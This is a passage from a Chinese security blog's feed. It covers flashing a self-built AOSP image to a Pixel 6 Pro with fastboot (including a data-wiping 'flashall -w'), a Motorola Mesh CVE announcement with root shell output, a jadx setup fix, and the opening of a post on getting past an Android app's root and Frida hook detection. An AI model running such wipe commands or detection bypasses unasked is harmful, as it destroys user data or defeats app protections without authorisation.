instead.<br>[ <span class="hljs-number">89</span>% <span class="hljs-number">176</span><span class="hljs-regexp">/197] /</span><span class="hljs-regexp">/packages/</span>apps/Launcher3:Launcher3QuickStepLib kotlinc [common]<br>WARN: Attempt to load key <span class="hljs-string">&#x27;java.correct.class.type.by.place.resolve.scope&#x27;</span> <span class="hljs-keyword">for</span> not yet loaded registry<br>packages<span class="hljs-regexp">/apps/</span>Launcher3<span class="hljs-regexp">/quickstep/</span>src<span class="hljs-regexp">/com/</span>android<span class="hljs-regexp">/quickstep/</span>views/TaskMenuViewWithArrow.kt:<span class="hljs-number">171</span>:<span class="hljs-number">41</span>: warning: <span class="hljs-string">&#x27;getColor(Int): Int&#x27;</span> is deprecated. Deprecated <span class="hljs-keyword">in</span> Java<br>        divider.paint.color = resources.getColor(android.R.color.transparent)<br>                                        ^<br>[<span class="hljs-number">100</span>% <span class="hljs-number">195</span><span class="hljs-regexp">/195] Target vbmeta image: out/</span>target<span class="hljs-regexp">/product/</span>raven/vbmeta.img<br><br><span class="hljs-comment">#### build completed successfully (02:26 (mm:ss)) ####</span><br></code></pre></td></tr></table></figure><p>编译完后，可以在 &#x2F;out&#x2F;target&#x2F;product&#x2F;raven&#x2F; 目录中看到编译出来的文件和镜像</p><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20240208134708798.png"></p><h2 id="单独编译"><a href="#单独编译" class="headerlink" title="单独编译"></a>单独编译</h2><p>单独编译Setting 应用模块<br>在AOSP 根目录执行：</p><blockquote><p>source build&#x2F;envsetup.sh<br>lunch aosp_raven-userdebug<br>cd packages&#x2F;apps&#x2F;Settings<br>mm</p></blockquote><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231221145521799.png"></p><h2 id="编译单个apk"><a href="#编译单个apk" class="headerlink" title="编译单个apk"></a>编译单个apk</h2><p>找到对应的源码<br>vim packages&#x2F;apps&#x2F;Launcher3&#x2F;src&#x2F;com&#x2F;android&#x2F;launcher3&#x2F;Launcher.java</p><p>添加一个Log 输出。<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231229144002364.png"><br>重新编译</p><blockquote><p>source build&#x2F;envsetup.sh<br>lunch aosp_raven-userdebug<br>make Launcher3</p></blockquote><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231229144156629.png"></p><p>安装apk，启动app，然后在日志中可以看到打印的日志信息了。</p><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231229151457255.png"></p><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><h2 id="分区介绍"><a href="#分区介绍" class="headerlink" title="分区介绍"></a>分区介绍</h2><p>由于我们刷机要用到fastboot 来进行刷机，这里先介绍一下在android系统中，有哪些分区。</p><blockquote></blockquote><p> system: 系统分区，刷机一般都是刷这个分区<br> userdata: 数据分区<br> cache: 缓存分区<br> recovery: recovery 分区<br> boot： 存放内核和ramdisk的分区<br> radio: 基带所在的分区</p><h2 id="fastboot"><a href="#fastboot" class="headerlink" title="fastboot"></a>fastboot</h2><p>可能之前在解锁root的时候，或者刷入分区的时候，会看到boot_a ，system_b 。其中a 和 b 是android 的特性。</p><p>在android 中，使用的是A&#x2F;B分区的方案，A&#x2F;B 分区方案是一种用于提供系统更新和回滚功能的机制。它通过将设备的存储空间划分为两个完全独立的分区，这种双分区的设计允许在进行系统更新时进行无缝切换。当设备接收到新的系统更新时，它会将更新应用到未使用的分区（例如，如果当前正在使用 <code>boot_a</code> 分区，则将更新应用到 <code>boot_b</code> 分区），而不会中断设备的正常运行。一旦更新完成，设备可以在下次启动时切换到新的分区，并且之前使用的分区成为备份。</p><p>可以通过查看current-slot 属性查看当前设备使用那个分区，pixel 6P 使用的是 B 分区</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less">E:\file\pixel6p\aosp编译&gt;fastboot getvar <span class="hljs-attribute">all</span><br><span class="hljs-attribute">...</span><br><span class="hljs-attribute">(bootloader) current-slot</span>:b <span class="hljs-comment">// 当前使用的是 b 分区</span><br>(bootloader) <span class="hljs-attribute">ddr-manu</span>:Micron<br>(bootloader) <span class="hljs-attribute">ddr-size</span>:<span class="hljs-number">12</span>GB<br>(bootloader) <span class="hljs-attribute">ddr-type</span>:LPDDR5<br>(bootloader) <span class="hljs-attribute">enter-reason</span>:reboot bootloader<br>(bootloader) <span class="hljs-attribute">erase-block-size</span>:<span class="hljs-number">0</span>x1000<br>(bootloader) <span class="hljs-attribute">fdevinit-count</span>:<span class="hljs-number">0</span><br>(bootloader) <span class="hljs-attribute">fdevinit-set-time</span>:<span class="hljs-number">0</span><br>(bootloader) <span class="hljs-attribute">fdevinit-total-time</span>:<span class="hljs-number">0</span><br>(bootloader) <span class="hljs-attribute">fg-soc</span>:<span class="hljs-number">92.13</span> %<br>(bootloader) <span class="hljs-attribute">has-slot</span>:<span class="hljs-attribute">persist</span>:no   <span class="hljs-comment">// has-slot 表示是否支持A/B分区</span><br>...<br></code></pre></td></tr></table></figure><h2 id="手动刷分区"><a href="#手动刷分区" class="headerlink" title="手动刷分区"></a>手动刷分区</h2><p>如果你仅仅只想刷一个单独的分区，只需要先进入fastboot 模式</p><blockquote><p>adb reboot fastboot</p></blockquote><p>然后进入编译出来的out 目录内，或者将其中的对应分区的镜像复制出来，然后 fastboot flash 命令来对分区刷入对应的镜像。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs smali">E:\file\pixel6p\aosp_complie\raven&gt;adb reboot fastboot<br><br>E:\file\pixel6p\aosp_complie\raven&gt;fastboot flash<span class="hljs-keyword"> system</span><span class="hljs-keyword"> system</span>.img<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.009s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 1/4 (262112 KB)          OKAY [  8.797s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.335s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 2/4 (262116 KB)          OKAY [  8.851s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.293s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 3/4 (262140 KB)          OKAY [  8.863s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.287s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 4/4 (76168 KB)           OKAY [  2.521s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.126s]<br>Finished. Total time: 30.782s<br><br>E:\file\pixel6p\aosp_complie\raven&gt;fastboot flash vendor vendor.img<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;vendor_b&#x27;                                OKAY [  0.011s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_b&#x27; 1/3 (262120 KB)          OKAY [  8.663s]<br>Writing &#x27;vendor_b&#x27;                                 OKAY [  0.355s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_b&#x27; 2/3 (262140 KB)          OKAY [  8.586s]<br>Writing &#x27;vendor_b&#x27;                                 OKAY [  0.355s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_b&#x27; 3/3 (116832 KB)          OKAY [  3.846s]<br>Writing &#x27;vendor_b&#x27;                                 OKAY [  0.166s]<br>Finished. Total time: 22.539s<br><br>E:\file\pixel6p\aosp_complie\raven&gt;fastboot flash radio radio.img<br>Sending &#x27;radio&#x27; (94660 KB)                         OKAY [  3.288s]<br>Writing &#x27;radio&#x27;                                    FAILED (remote: &#x27;No such file<span class="hljs-built_in"> or </span>directory&#x27;)<br>fastboot: error: Command failed<br><br>E:\file\pixel6p\aosp_complie\raven&gt;fastboot flash bootloader bootloader.img<br>Sending &#x27;bootloader&#x27; (13870 KB)                    OKAY [  0.480s]<br>Writing &#x27;bootloader&#x27;                               FAILED (remote: &#x27;No such file<span class="hljs-built_in"> or </span>directory&#x27;)<br>fastboot: error: Command failed<br><br>E:\file\pixel6p\aosp_complie\raven&gt;fastboot flash<span class="hljs-keyword"> system</span> super_empty.img<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.016s]<br>Sending &#x27;system_b&#x27; (4 KB)                          OKAY [  0.000s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.048s]<br>Finished. Total time: 0.078s<br></code></pre></td></tr></table></figure><h2 id="flashall自动刷入"><a href="#flashall自动刷入" class="headerlink" title="flashall自动刷入"></a>flashall自动刷入</h2><p>上面是手动分别往单个的分区刷入镜像，当然可以手动的刷入镜像，也可以自动刷，比如官方的升级包zip 文件，可以直接执行flash-all.bat 文件。</p><p>分析了一下 flash-all.bat 文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">PATH=%PATH%;<span class="hljs-string">&quot;%SYSTEMROOT%\System32&quot;</span><br>fastboot flash bootloader bootloader-raven-slider-<span class="hljs-number">1.2</span>-<span class="hljs-number">9152140</span>.img<br>fastboot reboot-bootloader<br>ping -n <span class="hljs-number">5</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &gt;nul<br>fastboot flash radio radio-raven-g5123b-<span class="hljs-number">107485</span>-<span class="hljs-number">221101</span>-b-<span class="hljs-number">9242015</span>.img<br>fastboot reboot-bootloader<br>ping -n <span class="hljs-number">5</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &gt;nul<br>fastboot -w update image-raven-tq1a.<span class="hljs-number">230205.002</span>.zip<br><br>echo Press any key to <span class="hljs-keyword">exit</span>...<br>pause &gt;nul<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>用到了flash -w update 命令。</p><p>这里可以直接使用fastboot flashall -w 来刷入编译好的镜像，前提是设置好out目录的路径。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs smali">E:\file\pixel6p\aosp_complie\aosp_test4&gt;adb reboot bootloader<br><br>E:\file\pixel6p\aosp_complie\aosp_test4&gt;fastboot flashall -w<br>--------------------------------------------<br>Bootloader Version...: slider-1.2-9152140<br>Baseband Version.....: g5123b-107485-221101-B-9242015<br>Serial Number........: 1B231FDEE005T0<br>--------------------------------------------<br>Checking &#x27;product&#x27;                                 OKAY [  0.000s]<br>Setting current slot to &#x27;a&#x27;                        OKAY [  0.088s]<br>Sending &#x27;boot_a&#x27; (65536 KB)                        OKAY [  2.143s]<br>Writing &#x27;boot_a&#x27;                                   OKAY [  0.080s]<br>Sending &#x27;dtbo_a&#x27; (16384 KB)                        OKAY [  0.530s]<br>Writing &#x27;dtbo_a&#x27;                                   OKAY [  0.021s]<br>Sending &#x27;pvmfw_a&#x27; (1024 KB)                        OKAY [  0.034s]<br>Writing &#x27;pvmfw_a&#x27;                                  OKAY [  0.004s]<br>Sending &#x27;vbmeta_a&#x27; (8 KB)                          OKAY [  0.001s]<br>Writing &#x27;vbmeta_a&#x27;                                 OKAY [  0.003s]<br>Sending &#x27;vbmeta_system_a&#x27; (4 KB)                   OKAY [  0.001s]<br>Writing &#x27;vbmeta_system_a&#x27;                          OKAY [  0.003s]<br>Sending &#x27;vendor_boot_a&#x27; (65536 KB)                 OKAY [  2.111s]<br>Writing &#x27;vendor_boot_a&#x27;                            OKAY [  0.081s]<br>Rebooting into fastboot                            OKAY [  0.000s]<br>&lt; waiting for any device &gt;<br>Sending &#x27;super&#x27; (4 KB)                             OKAY [  0.001s]<br>Updating super partition                           OKAY [  0.021s]<br>Resizing &#x27;product_a&#x27;                               OKAY [  0.002s]<br>Resizing &#x27;system_a&#x27;                                OKAY [  0.003s]<br>Resizing &#x27;system_ext_a&#x27;                            OKAY [  0.003s]<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.002s]<br>Resizing &#x27;vendor_a&#x27;                                OKAY [  0.002s]<br>Resizing &#x27;vendor_dlkm_a&#x27;                           OKAY [  0.002s]<br>Resizing &#x27;vendor_b&#x27;                                OKAY [  0.003s]<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;product_a&#x27;                               OKAY [  0.003s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_a&#x27; 1/2 (262140 KB)         OKAY [  8.634s]<br>Writing &#x27;product_a&#x27;                                OKAY [  0.355s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_a&#x27; 2/2 (93456 KB)          OKAY [  3.014s]<br>Writing &#x27;product_a&#x27;                                OKAY [  0.158s]<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;system_a&#x27;                                OKAY [  0.007s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_a&#x27; 1/4 (262112 KB)          OKAY [  8.711s]<br>Writing &#x27;system_a&#x27;                                 OKAY [  0.385s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_a&#x27; 2/4 (262116 KB)          OKAY [  8.601s]<br>Writing &#x27;system_a&#x27;                                 OKAY [  0.386s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_a&#x27; 3/4 (262140 KB)          OKAY [  8.511s]<br>Writing &#x27;system_a&#x27;                                 OKAY [  0.319s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_a&#x27; 4/4 (76168 KB)           OKAY [  2.451s]<br>Writing &#x27;system_a&#x27;                                 OKAY [  0.161s]<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;system_ext_a&#x27;                            OKAY [  0.006s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_ext_a&#x27; 1/2 (262116 KB)      OKAY [  8.721s]<br>Writing &#x27;system_ext_a&#x27;                             OKAY [  0.369s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_ext_a&#x27; 2/2 (51120 KB)       OKAY [  1.638s]<br>Writing &#x27;system_ext_a&#x27;                             OKAY [  0.120s]<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.004s]<br>Sending &#x27;system_b&#x27; (26672 KB)                      OKAY [  0.862s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.079s]<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>Resizing &#x27;vendor_a&#x27;                                OKAY [  0.004s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_a&#x27; 1/3 (262116 KB)          OKAY [  8.519s]<br>Writing &#x27;vendor_a&#x27;                                 OKAY [  0.409s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_a&#x27; 2/3 (262140 KB)          OKAY [  8.520s]<br>Writing &#x27;vendor_a&#x27;                                 OKAY [  0.409s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_a&#x27; 3/3 (24880 KB)           OKAY [  0.809s]<br>Writing &#x27;vendor_a&#x27;                                 OKAY [  0.119s]<br>Resizing &#x27;vendor_dlkm_a&#x27;                           OKAY [  0.004s]<br>Sending &#x27;vendor_dlkm_a&#x27; (40872 KB)                 OKAY [  1.308s]<br>Writing &#x27;vendor_dlkm_a&#x27;                            OKAY [  0.141s]<br>Erasing &#x27;userdata&#x27;                                 OKAY [  0.161s]<br>Erase successful, but<span class="hljs-built_in"> not </span>automatically formatting.<br>File<span class="hljs-keyword"> system</span> type raw<span class="hljs-built_in"> not </span>supported.<br>Erasing &#x27;metadata&#x27;                                 OKAY [  0.004s]<br>Erase successful, but<span class="hljs-built_in"> not </span>automatically formatting.<br>File<span class="hljs-keyword"> system</span> type raw<span class="hljs-built_in"> not </span>supported.<br>Rebooting                                          OKAY [  0.000s]<br>Finished. Total time: 99.470s<br><br><br>adb shell 直接就可以获取root<br><br>raven:/ <span class="hljs-comment"># uname -a</span><br>Linux localhost 5.10.149-android13-4-00003-gebdbc9fbe2e2-ab9664856 <span class="hljs-comment">#1 SMP PREEMPT Mon Feb 27 10:44:09 UTC 2023 aarch64 Toybox</span><br></code></pre></td></tr></table></figure><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231227164307134.jpeg"></p><h1 id="刷机成砖"><a href="#刷机成砖" class="headerlink" title="刷机成砖"></a>刷机成砖</h1><p>其实我前前后后编译刷机，由于对一些步骤和文件的不了解和误操作，导致了很多次的成砖，所谓的成砖又很多种表现方式，比如开机卡在了google log标志，或者一直卡在fastboot 页面，也有可能开机后插上usb数据线，但拔出后手机无限重启等等奇奇怪怪的问题。</p><p>这时候就需要去google 下载对应机型的出厂镜像，直接执行flash-all.bat</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>自己编译AOSP的过程遇到了各种各样的错误，但是这个过程收获了很多。遇到问题要善于利用搜索引擎。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Motorola_Mesh漏洞公告</title>
    <link href="/2024/01/14/Motorola_Mesh%20%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A/"/>
    <url>/2024/01/14/Motorola_Mesh%20%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<p>22年挖的洞，终于出了漏洞公告，和厂商沟通，披露漏洞，等待修复漏洞的过程真漫长。QAQ</p><p>CVE-2022-4001, CVE-2022-4002, CVE-2022-4003。</p><p><img src="/Motorola_Mesh%20%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A.assets/image-20240114224245425.png"></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><br>root@Q14-D5A27C:/<span class="hljs-keyword">proc</span>#<span class="hljs-title"> cat</span> cmdline<span class="hljs-title"> </span><br><span class="hljs-title">console=ttyMSM0,115200n8</span> cnss2.bdf_pci0=0x60<span class="hljs-title"> cnss2.bdf_pci1=0xb0</span> cnss2.bdf_integrated=0x24<span class="hljs-title"> root=PARTUUID=342a2f0b-6b85-7a0a-fe00-11d8f55512d6</span> rootwait<span class="hljs-title"> swiotlb=1</span> coherent_pool=2M<span class="hljs-title"></span><br><span class="hljs-title">root@Q14-D5A27C:/proc#</span> cat<span class="hljs-title"> cpuinfo</span> <span class="hljs-title"></span><br><span class="hljs-title">processor</span>: 0<span class="hljs-title"></span><br><span class="hljs-title">model</span> name:<span class="hljs-title"> ARMv7</span> Processor<span class="hljs-title"> rev</span> 4 (v7l)<span class="hljs-title"></span><br><span class="hljs-title">BogoMIPS</span>: 60.48<span class="hljs-title"></span><br><span class="hljs-title">Features</span>:<span class="hljs-title"> half</span> thumb<span class="hljs-title"> fastmult</span> vfp<span class="hljs-title"> edsp</span> neon<span class="hljs-title"> vfpv3</span> tls<span class="hljs-title"> vfpv4</span> idiva<span class="hljs-title"> idivt</span> vfpd32<span class="hljs-title"> lpae</span> evtstrm<span class="hljs-title"> aes</span> pmull<span class="hljs-title"> sha1</span> sha2<span class="hljs-title"> crc32</span> <span class="hljs-title"></span><br><span class="hljs-title">CPU</span> implementer: 0x51<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> architecture: 7<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> variant: 0xa<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> part: 0x801<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> revision: 4<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">processor</span>: 1<span class="hljs-title"></span><br><span class="hljs-title">model</span> name:<span class="hljs-title"> ARMv7</span> Processor<span class="hljs-title"> rev</span> 4 (v7l)<span class="hljs-title"></span><br><span class="hljs-title">BogoMIPS</span>: 60.48<span class="hljs-title"></span><br><span class="hljs-title">Features</span>:<span class="hljs-title"> half</span> thumb<span class="hljs-title"> fastmult</span> vfp<span class="hljs-title"> edsp</span> neon<span class="hljs-title"> vfpv3</span> tls<span class="hljs-title"> vfpv4</span> idiva<span class="hljs-title"> idivt</span> vfpd32<span class="hljs-title"> lpae</span> evtstrm<span class="hljs-title"> aes</span> pmull<span class="hljs-title"> sha1</span> sha2<span class="hljs-title"> crc32</span> <span class="hljs-title"></span><br><span class="hljs-title">CPU</span> implementer: 0x51<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> architecture: 7<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> variant: 0xa<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> part: 0x801<span class="hljs-title"></span><br><span class="hljs-title">CPU</span> revision: 4<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">Hardware</span>:<span class="hljs-title"> Generic</span> DT<span class="hljs-title"> based</span> system<span class="hljs-title"></span><br><span class="hljs-title">Revision</span>: 0000<span class="hljs-title"></span><br><span class="hljs-title">Serial</span>: 0000000000000000<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>环境搭建_jadx_内存不足&amp;使用闪退</title>
    <link href="/2024/01/14/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80/"/>
    <url>/2024/01/14/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80/</url>
    
    <content type="html"><![CDATA[<p>原因： 内存不够，现在很多app 打开很卡顿。</p><p><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112141220163.png"></p><p>版本：jadx-1.4.7.zip</p><p><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112140019701.png"></p><p>其实是找不到对应的JAVA_HOME，是由于jadx 是要 jdk 8 的环境。所以版本太高了。<br><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112140040762.png"></p><p>配置环境变量<br><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112140935012.png"><br>配置PATH<br><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112141026516.png"></p><p><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112140754356.png"></p><p>可以打开了</p><p><img src="/110_jadx_%E5%86%85%E5%AD%98%E4%B8%8D%E5%A4%9F_%E4%BD%BF%E7%94%A8%E9%97%AA%E9%80%80.assets/image-20240112141114650.png"></p><p>在 jadx-gui.bat 内</p><blockquote><p>@rem Add default JVM options here. You can also use JAVA_OPTS and JADX_GUI_OPTS to pass JVM options to this script.<br>set DEFAULT_JVM_OPTS&#x3D;”-Xms128M” “-XX:MaxRAMPercentage&#x3D;70.0” “-XX:+UseG1GC” “-Dawt.useSystemAAFontSettings&#x3D;lcd” “-Dswing.aatext&#x3D;true” “-Djava.util.Arrays.useLegacyMergeSort&#x3D;true”</p></blockquote><p>表示 jadx 最大堆内存为系统可用内存的百分只70。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apk逆向__他趣APP脱壳&amp;运行环境检测分析</title>
    <link href="/2024/01/14/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP/"/>
    <url>/2024/01/14/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP/</url>
    
    <content type="html"><![CDATA[<h2 id="ROOT检测"><a href="#ROOT检测" class="headerlink" title="ROOT检测"></a>ROOT检测</h2><p>“  当前APP运行环境存在风险 (Root设备)，请您及时知晓并注意信息安全! “</p><p><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240109221636023.png"></p><h2 id="Hook-检测"><a href="#Hook-检测" class="headerlink" title="Hook 检测"></a>Hook 检测</h2><p>使用算法助手定位到root检测弹窗的一些常规设置，去除弹窗，或者其他的绕过。<br>当使用算法助手hook app 的时候，app 会检测hook 的环境，从而闪退。</p><p>使用frida 脚本直接闪退<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240110215010880.png"></p><blockquote><p> frida -U -p 32218 -l .\java_hook通杀.js<br> 可以看到直接会闪退。<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240110215626753.png"></p></blockquote><h3 id="load-so-js"><a href="#load-so-js" class="headerlink" title="load_so.js"></a>load_so.js</h3><p>这里可以判定apk 使用了一些方法来阻止frida 进行hook， 一般是在 so 文件内进行处理。所以这里我们直接可以找找app在运行的过程中，使用了那些so。最后调用的那个so 文件，就是检测hook环境的库文件。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 